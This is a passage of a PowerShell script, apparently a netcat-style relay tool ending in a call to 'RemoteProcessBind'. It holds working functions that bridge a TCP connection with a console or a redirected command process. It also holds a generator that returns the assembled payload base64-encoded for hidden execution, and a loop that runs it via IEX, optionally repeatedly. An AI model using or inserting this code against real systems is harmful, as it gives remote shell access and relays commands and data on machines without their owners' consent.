    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["StreamBytesRead"] = 1
    return $FuncVars
  }
  function ReadData_TCP
  {
    param($FuncVars)
    $Data = $null
    if($FuncVars["StreamBytesRead"] -eq 0){break}
    if($FuncVars["StreamReadOperation"].IsCompleted)
    {
      $StreamBytesRead = $FuncVars["Stream"].EndRead($FuncVars["StreamReadOperation"])
      if($StreamBytesRead -eq 0){break}
      $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
      $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_TCP
  {
    param($Data,$FuncVars)
    $FuncVars["Stream"].Write($Data, 0, $Data.Length)
    return $FuncVars
  }
  function Close_TCP
  {
    param($FuncVars)
    try{$FuncVars["Stream"].Close()}
    catch{}
    if($FuncVars["l"]){$FuncVars["Socket"].Stop()}
    else{$FuncVars["Socket"].Close()}
  }
  function Setup_CMD
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    $FuncVars = @{}
    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessStartInfo.FileName = $FuncSetupVars[0]
    $ProcessStartInfo.UseShellExecute = $False
    $ProcessStartInfo.RedirectStandardInput = $True
    $ProcessStartInfo.RedirectStandardOutput = $True
    $ProcessStartInfo.RedirectStandardError = $True
    $FuncVars["Process"] = [System.Diagnostics.Process]::Start($ProcessStartInfo)
    Write-Verbose ("Starting Process " + $FuncSetupVars[0] + "...")
    $FuncVars["Process"].Start() | Out-Null
    $FuncVars["StdOutDestinationBuffer"] = New-Object System.Byte[] 65536
    $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
    $FuncVars["StdErrDestinationBuffer"] = New-Object System.Byte[] 65536
    $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    return $FuncVars
  }
  function ReadData_CMD
  {
    param($FuncVars)
    [byte[]]$Data = @()
    if($FuncVars["StdOutReadOperation"].IsCompleted)
    {
      $StdOutBytesRead = $FuncVars["Process"].StandardOutput.BaseStream.EndRead($FuncVars["StdOutReadOperation"])
      if($StdOutBytesRead -eq 0){break}
      $Data += $FuncVars["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)]
      $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
    }
    if($FuncVars["StdErrReadOperation"].IsCompleted)
    {
      $StdErrBytesRead = $FuncVars["Process"].StandardError.BaseStream.EndRead($FuncVars["StdErrReadOperation"])
      if($StdErrBytesRead -eq 0){break}
      $Data += $FuncVars["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)]
      $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_CMD
  {
    param($Data,$FuncVars)
    $FuncVars["Process"].StandardInput.WriteLine($FuncVars["Encoding"].GetString($Data).TrimEnd("`r").TrimEnd("`n"))
    return $FuncVars
  }
  function Close_CMD
  {
    param($FuncVars)
    $FuncVars["Process"] | Stop-Process
  }  
  function Setup_Console
  {
    param($FuncSetupVars)
    $FuncVars = @{}
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["Output"] = $FuncSetupVars[0]
    $FuncVars["OutputBytes"] = [byte[]]@()
    $FuncVars["OutputString"] = ""
    return $FuncVars
  }
  function ReadData_Console
  {
    param($FuncVars)
    $Data = $null
    if($Host.UI.RawUI.KeyAvailable)
    {
      $Data = $FuncVars["Encoding"].GetBytes((Read-Host) + "`n")
    }
    return $Data,$FuncVars
  }
  function WriteData_Console
  {
    param($Data,$FuncVars)
    switch($FuncVars["Output"])
    {
      "Host" {Write-Host -n $FuncVars["Encoding"].GetString($Data)}
      "String" {$FuncVars["OutputString"] += $FuncVars["Encoding"].GetString($Data)}
      "Bytes" {$FuncVars["OutputBytes"] += $Data}
    }
    return $FuncVars
  }
  function Close_Console
  {
    param($FuncVars)
    if($FuncVars["OutputString"] -ne ""){return $FuncVars["OutputString"]}
    elseif($FuncVars["OutputBytes"] -ne @()){return $FuncVars["OutputBytes"]}
    return
  }
  function Main
  {
    param($Stream1SetupVars,$Stream2SetupVars)
    try
    {
      [byte[]]$InputToWrite = @()
      $Encoding = New-Object System.Text.AsciiEncoding
      if($i -ne $null)
      {
        Write-Verbose "Input from -i detected..."
        if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
        elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
        else{Write-Host "Unrecognised input type." ; return}
      }
      
      Write-Verbose "Setting up Stream 1..."
      try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
      catch{Write-Verbose "Stream 1 Setup Failure" ; return}
      
      Write-Verbose "Setting up Stream 2..."
      try{$Stream2Vars = Stream2_Setup $Stream2SetupVars}
      catch{Write-Verbose "Stream 2 Setup Failure" ; return}
      
      $Data = $null
      
      if($InputToWrite -ne @())
      {
        Write-Verbose "Writing input to Stream 1..."
        try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
        catch{Write-Host "Failed to write input to Stream 1" ; return}
      }
      
      if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
      
      Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
      while($True)
      {
        try
        {
          $Data,$Stream2Vars = Stream2_ReadData $Stream2Vars
          if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
        }
        
        try
        {
          $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
          if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$Stream2Vars = Stream2_WriteData $Data $Stream2Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
        }
      }
    }
    finally
    {
      try
      {
        Stream2_Close $Stream2Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 2"
      }
      try
      {
        Stream1_Close $Stream1Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 1"
      }
    }
  }

  Write-Verbose "Set Stream 1: TCP"
  $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
  $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
  $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
  $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
  if($l){$InvokeString = "Main @('',`$True,$p,$t) "}
  else{$InvokeString = "Main @('$c',`$False,$p,$t) "}


  Write-Verbose "Set Stream 2: Console"
  $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_Console} + "`n}`n`n")
  $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_Console} + "`n}`n`n")
  $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_Console} + "`n}`n`n")
  $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_Console} + "`n}`n`n")
  $InvokeString += ("@('" + $o + "')")

  
  $FunctionString += ("function Main`n{`n" + ${function:Main} + "`n}`n`n")
  $InvokeString = ($FunctionString + $InvokeString)
  if($ge){Write-Verbose "Returning Encoded Payload..." ; return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
  elseif($g){Write-Verbose "Returning Payload..." ; return $InvokeString}
  
  $Output = $null
  try
  {
    if($rep)
    {
      while($True)
      {
        $Output += IEX $InvokeString
        Start-Sleep -s 2
        Write-Verbose "Repetition Enabled: Restarting..."
      }
    }
    else
    {
      $Output += IEX $InvokeString
    }
  }
  finally
  {
    if($Output -ne $null)
    {
      if($of -eq ""){$Output}
      else{[io.file]::WriteAllBytes($of,$Output)}
    }
  }
}

RemoteProcessBind
